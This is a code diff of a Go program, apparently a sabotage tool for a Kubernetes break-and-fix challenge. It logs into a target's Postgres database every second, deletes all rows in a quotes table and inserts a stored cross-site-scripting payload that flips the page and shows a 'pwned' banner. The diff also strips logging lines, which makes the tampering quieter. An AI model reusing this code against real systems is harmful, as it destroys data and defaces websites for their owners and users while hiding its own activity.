@@ -56,9 +56,8 @@ func stack() []byte {
 	}
 }
 
-func updateDatabase() error {
+func updateDatabase(force bool) error {
 	conn := fmt.Sprintf("postgresql://%s:%s@%s/klustered?sslmode=disable", pgUser, pgPass, target)
-	klog.Infof("trying %s ...", conn)
 	db, err := sql.Open("postgres", conn)
 	defer db.Close()
 
@@ -77,11 +76,21 @@ func updateDatabase() error {
 		total++
 	}
 
-	if total > 0 {
-		klog.Infof("%d unexpected rows found", total)
+	if force || total > 0 {
+		klog.Infof("updating...")
 		db.Exec(`DELETE FROM quotes;`)
 		db.Exec(`INSERT INTO quotes (quote, author, link) VALUES (
-				'<script>document.getElementsByTagName("body")[0].style.transform = "rotate(180deg)";</script><img src=https://pbs.twimg.com/media/E3-EVFnWEAIZFB2?format=jpg><h1>pwned by Da West Chainguard Massif</h1></body></html><!--',
+				'<style>
+				h1 {
+					text-shadow: 1px 1px 2px black, 0 0 25px red, 0 0 5px darkred;
+					color: #fff;
+					font-size: 100px;
+				}
+				img {
+					width: 30%;
+				}
+				</style>
+				<script>document.getElementsByTagName("body")[0].style.transform = "rotate(180deg)";</script><img src=http://libthom.so/hair.jpg><h1>pwned by Da West Chainguard Massiv!</h1></body></html><!--',
 				'',
 				'');`)
 	}
@@ -90,11 +99,18 @@ func updateDatabase() error {
 
 func main() {
 	go serve()
+	count := 0
 
 	for {
-		time.Sleep(5 * time.Second)
-		if err := updateDatabase(); err != nil {
-			klog.Errorf("update: %v", err)
+		count++
+		force := false
+		if count < 2 {
+			force = true
+		}
+
+		time.Sleep(1 * time.Second)
+		if err := updateDatabase(force); err != nil {
+			klog.V(1).Infof("update: %v", err)
 		}
 	}
 }
